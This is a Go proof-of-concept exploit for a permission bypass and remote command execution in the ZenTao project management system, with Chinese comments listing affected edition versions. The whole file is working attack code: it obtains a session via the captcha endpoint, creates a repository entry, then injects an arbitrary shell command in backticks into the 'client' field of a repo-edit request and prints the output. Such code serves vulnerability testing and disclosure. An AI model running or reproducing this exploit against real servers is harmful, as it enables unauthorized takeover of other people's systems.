/*
权限绕过+RCE POC 伪静态传参版
禅道系统 影响版本 安全版本
开源版 17.4以下的未知版本<=version<=18.0.beta1 18.0.beta2
旗舰版 3.4以下的未知版本<=version<=4.0.beta1 4.0.beta2
企业版 7.4以下的未知版本<=version<=8.0.beta1 8.0.beta2
*/
package main

import (
	"bytes"
	"flag"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"net/http"
	"regexp"
)

func exp(url string, execute string) string {
	Header1 := map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Accept-Language": "zh-CN,zh;q=0.9", "Cookie": "zentaosid=ggbond; lang=zh-cn; device=desktop; theme=default"}
	Header2 := map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Accept-Language": "zh-CN,zh;q=0.9", "Cookie": "zentaosid=ggbond; lang=zh-cn; device=desktop; theme=default", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Referer": url + "repo-edit-1-0.html"}
	// 建立会话
	client := http.Client{}
	// 请求第一步
	req1, err := http.NewRequest("GET", url+"misc-captcha-user.html", nil)
	if err != nil {
		panic(err)
	}
	for k, v := range Header1 {
		req1.Header.Set(k, v)
	}
	client.Do(req1)
	body1 := bytes.NewBufferString("product[]=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=")

	// 请求第二步
	req2, err := http.NewRequest("POST", url+"repo-create.html", body1)
	if err != nil {
		panic(err)
	}
	for k, v := range Header2 {
		req2.Header.Set(k, v)
	}
	client.Do(req2)
	body2 := bytes.NewBufferString("SCM=Git&path=/etc&client=`" + execute + "`")
	// 请求第三步
	req3, err := http.NewRequest("POST", url+"repo-edit-10000-10000.html", body2)
	if err != nil {
		panic(err)
	}
	for k, v := range Header2 {
		req3.Header.Set(k, v)
	}
	rep3, _ := client.Do(req3)
	defer rep3.Body.Close()
	// 获取命令执行结果
	result, _ := goquery.NewDocumentFromReader(rep3.Body)
	reg, _ := regexp.MatchString(".sh:", result.Text())
	if reg {
		return "存在漏洞,执行结果如下：\n" + result.Text()
	} else {
		return "未发现漏洞"
	}
}
func main() {
	var execute string
	var url string
	flag.StringVar(&url, "u", "", "指定url")
	flag.StringVar(&execute, "exec", "id", "命令，默认为id")
	flag.Parse()
	fmt.Println(exp(url, execute))
}
